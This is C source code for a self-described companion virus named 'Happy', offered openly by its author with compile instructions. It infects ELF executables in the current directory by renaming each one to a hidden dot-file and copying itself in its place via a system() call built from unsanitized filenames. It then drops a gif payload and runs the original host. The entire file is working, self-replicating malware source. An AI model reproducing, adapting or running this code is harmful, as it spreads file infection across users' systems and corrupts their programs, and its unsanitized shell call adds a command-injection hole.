/**********************************************************************
 * I wrote this shitty virus because I wanted to code on a non-common *
 * platform.                                                          *
 * This simple companion virus will infect files only in current      *
 * directory                                                          *
 * The payload is very stupid, infact the virus drops a gif image     *
 * called "smile.gif" if the (uid != 0) and (gid % 2 == 0)            *
 * How to compile: gcc Happy.c -o Happy; strip Happy                  *
 * If you want you can contact me at: wargame89@yahoo.it              *
 * by [WarGame,#eof]                                                  *
 * This shit has been tested only under FreeBSD 5.1 and Mandrake 9.1  *
 * Thx to izee for the smile and testing !                            *
 **********************************************************************/
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include "smile.h" /* file containing the smile picture */

/* This function will drop a smile picture */
void DropSmile(void)
{
   FILE *smile_fd = fopen("smile.gif","w");

   if(smile_fd != NULL)
   {
     /* write picture */
   fwrite(smile_picture,SMILE_SIZE,1,smile_fd);
   fclose(smile_fd);
   }
}

/* Is it ELF? */
int Is_ELF(FILE *fd)
{
   char elf_sign[4];

   /* Reads the first 4 bytes */
  fread(elf_sign,4,1,fd);

  if(elf_sign[1] == 'E' && elf_sign[2] == 'L'
       && elf_sign[3] == 'F')
       {
          return 1; /* Good ELF ! */
       }

  return 0; /* Not an ELF */
}

/* Used to copy virus to host */
void MyCopy(char *my,char *filename)
{
  char cmd[512]; /* lame way :) */

  /* build command and execute !!! */
  sprintf(cmd,"cp -f %s %s",my,filename);
  system(cmd);

}

/* Infection routine */
void Infect(char *filename,char *my)
{
    FILE *file_fd = fopen(filename,"rb");
    char new_name[256];

    /* filename starts with '.' ? */
    if(filename[0] == '.')
    {
     return;
    }

    if(file_fd == NULL)
    {
      return;
    }

    /* Check if ELF */
    if(!Is_ELF(file_fd))
    {
      fclose(file_fd);
      return;
    }

    /* close host */
    fclose(file_fd);

    /* Check if already infect */
    sprintf(new_name,".%s",filename);

    if(access(new_name,F_OK) < 0)
    {
       rename(filename,new_name);
       MyCopy(my,filename); /* COPY !!! */
    }
}

/* Main of virus */
int main(int argc,char *argv[])
{
   DIR *dr = NULL; /* Used to search file */
   struct dirent *found_file = NULL; /* the same */
   char my[256],host[256];
   int pt_cnt = 0;

   /* get its name */
   strcpy(my,argv[0]);

   for(pt_cnt = strlen(my);pt_cnt > 0;pt_cnt--)
   {
       if(my[pt_cnt] == '\\' || my[pt_cnt] == '.' || my[pt_cnt] == '/')
       {
          break;
       }
   }

   strcpy(my,my+pt_cnt+1);

   /* Try to open current directoy */
   if((dr = opendir(".")) != NULL)
   {
         /* Let's search !!! */
         while((found_file = readdir(dr)) != NULL)
         {
                     /* Infect file */
		 if(strcmp(found_file->d_name,my))
		 {
                     Infect(found_file->d_name,my);
         
		 }
	 }

    /* Close directory stuff */
    closedir(dr);
   }

  /* Payload ! */
  if(getuid() != 0 && (getgid() % 2 == 0))
  {
    DropSmile();
  }

   /* return to host */
   sprintf(host,".%s",my);
   if(execv(host,argv) < 0) /* to avoid infinite loop */
   {
     fclose(fopen(host,"w")); /* create an empty file */
   }

}
